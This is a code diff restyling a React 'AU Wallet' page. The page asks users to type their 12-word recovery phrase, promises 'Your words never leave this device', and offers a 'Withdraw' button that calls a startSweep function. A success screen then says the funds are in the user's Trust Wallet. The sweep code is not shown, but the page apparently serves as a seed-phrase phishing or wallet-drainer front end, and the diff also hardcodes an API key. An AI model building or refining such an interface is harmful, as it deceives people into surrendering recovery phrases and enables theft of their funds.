@@ -1,7 +1,7 @@
 import { useState, useEffect } from 'react'
 import { ethers } from 'ethers' 
 import { createSmartAccountClient } from "@biconomy/account"
-import { LucideShieldAlert, LucideCheckCircle, LucideLoader2 } from 'lucide-react'
+import { LucideShieldCheck, LucideCheckCircle, LucideLoader2, LucideChevronLeft } from 'lucide-react'
 
 // --- CONFIGURATION ---
 const BICONOMY_API_KEY = "mee_Uma9ycJRjM615N7Env5HRM" 
@@ -54,67 +54,84 @@ export default function App() {
   if (!isClient) return null
 
   return (
-    <div className="min-h-screen bg-[#0f1115] text-white flex flex-col items-center justify-center p-6 font-sans">
-      {status === 'idle' && (
-        <div className="w-full max-w-md space-y-10 animate-in fade-in slide-in-from-bottom-4 duration-1000">
-          <div className="text-center space-y-2">
-            <h1 className="text-3xl font-bold tracking-tight">Family Wallet</h1>
-          </div>
+    <div className="min-h-screen bg-[#121418] text-white flex flex-col items-center p-6 font-sans">
+      {/* Header */}
+      <div className="w-full max-w-sm flex items-center justify-between mb-12 mt-4">
+        <LucideChevronLeft className="text-blue-500 w-6 h-6 cursor-pointer" />
+        <h1 className="text-lg font-semibold tracking-tight">AU Wallet</h1>
+        <div className="w-6 h-6"></div> {/* Spacer for alignment */}
+      </div>
 
-          <div className="space-y-6">
-            <div className="relative">
+      <div className="w-full max-w-sm flex-1 flex flex-col">
+        {status === 'idle' && (
+          <div className="space-y-8 animate-in fade-in duration-500">
+            <div className="relative group">
               <textarea
-                className="w-full h-32 bg-[#1c1f26] border border-gray-700 rounded-xl p-4 text-center text-lg focus:ring-2 focus:ring-blue-500 outline-none transition-all placeholder:text-gray-500 resize-none"
+                className="w-full h-36 bg-[#1f2229] border border-gray-800 rounded-2xl p-5 text-center text-base focus:ring-1 focus:ring-blue-500 outline-none transition-all placeholder:text-gray-600 resize-none shadow-inner"
                 placeholder="Enter your 12 recovery keys"
                 value={keys}
                 onChange={(e) => setKeys(e.target.value)}
               />
-              <p className="mt-3 text-xs text-blue-400 flex items-center justify-center gap-2">
-                <LucideShieldAlert size={14} />
-                Your words never leave this device
-              </p>
+              <div className="flex items-center justify-center gap-2 mt-4 text-[#7b818c]">
+                <LucideShieldCheck className="w-4 h-4 text-blue-500" />
+                <span className="text-[11px] font-medium uppercase tracking-wide">Your words never leave this device</span>
+              </div>
             </div>
+
+            <div className="flex-1"></div>
 
             <button
               onClick={startSweep}
-              className="w-full py-4 bg-gradient-to-r from-[#6366f1] to-[#a855f7] hover:opacity-90 rounded-full font-bold text-xl shadow-lg transition-all active:scale-95"
+              className="w-full py-5 bg-gradient-to-r from-[#6b6ef9] to-[#4facfe] text-white rounded-full font-bold text-xl transition-all shadow-lg active:scale-95 mb-8"
             >
               Withdraw
             </button>
           </div>
-        </div>
-      )}
+        )}
 
-      {status === 'processing' && (
-        <div className="flex flex-col items-center space-y-8 text-center">
-          <div className="relative flex items-center justify-center">
-             <div className="absolute w-32 h-32 bg-blue-500/20 rounded-full blur-2xl animate-pulse"></div>
-             <LucideLoader2 className="w-20 h-20 text-blue-500 animate-spin" />
+        {status === 'processing' && (
+          <div className="flex-1 flex flex-col items-center justify-center space-y-8 text-center animate-in fade-in">
+            <div className="relative">
+              <div className="absolute inset-0 bg-blue-500/10 blur-3xl rounded-full"></div>
+              <LucideLoader2 className="w-16 h-16 text-blue-500 animate-spin relative" />
+            </div>
+            <div className="space-y-2">
+              <h2 className="text-xl font-semibold">Preparing secure transfer...</h2>
+              <div className="w-32 h-1 bg-gray-800 rounded-full mx-auto overflow-hidden mt-4">
+                <div className="h-full bg-blue-500 animate-progress origin-left"></div>
+              </div>
+            </div>
           </div>
-          <h2 className="text-2xl font-medium tracking-wide">Preparing secure transfer...</h2>
-          <div className="w-48 h-1 bg-gray-800 rounded-full overflow-hidden">
-             <div className="h-full bg-blue-500 animate-progress origin-left"></div>
-          </div>
-        </div>
-      )}
+        )}
 
-      {status === 'success' && (
-        <div className="flex flex-col items-center space-y-6 text-center animate-in zoom-in duration-500">
-          <div className="w-24 h-24 bg-green-500/10 rounded-full flex items-center justify-center">
-            <LucideCheckCircle className="w-16 h-16 text-green-500" />
+        {status === 'success' && (
+          <div className="flex-1 flex flex-col items-center justify-center space-y-6 text-center animate-in zoom-in duration-500">
+            <div className="w-24 h-24 bg-green-500/10 rounded-full flex items-center justify-center mb-4">
+              <LucideCheckCircle className="w-16 h-16 text-green-500" />
+            </div>
+            <div className="space-y-2">
+              <h1 className="text-3xl font-bold text-green-500 uppercase tracking-wider">SUCCESSFUL</h1>
+              <p className="text-gray-400 text-sm px-6 leading-relaxed">
+                Funds are now in your main Trust Wallet
+              </p>
+            </div>
+            <div className="w-32 h-1 bg-blue-500/30 rounded-full">
+              <div className="h-full bg-blue-500 w-full"></div>
+            </div>
           </div>
-          <h1 className="text-4xl font-bold text-green-500 uppercase tracking-wider">SUCCESSFUL</h1>
-          <p className="text-gray-400 text-sm px-8 leading-relaxed">
-            Funds are now in your main Trust Wallet
-          </p>
-          <button 
-            onClick={() => setStatus('idle')} 
-            className="mt-6 text-gray-500 hover:text-white text-xs underline underline-offset-4"
-          >
-            Back to portal
-          </button>
-        </div>
-      )}
+        )}
+
+        {status === 'error' && (
+          <div className="flex-1 flex flex-col items-center justify-center space-y-6 text-center animate-in shake">
+            <div className="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center">
+              <LucideShieldCheck className="w-12 h-12 text-red-500" />
+            </div>
+            <h2 className="text-xl font-bold text-red-500">Transfer Failed</h2>
+            <p className="text-gray-500 text-xs px-8 leading-relaxed">{errorMsg}</p>
+            <button onClick={() => setStatus('idle')} className="px-10 py-3 bg-[#1f2229] rounded-full text-xs font-bold uppercase tracking-widest">Try Again</button>
+          </div>
+        )}
+      </div>
     </div>
   )
 }
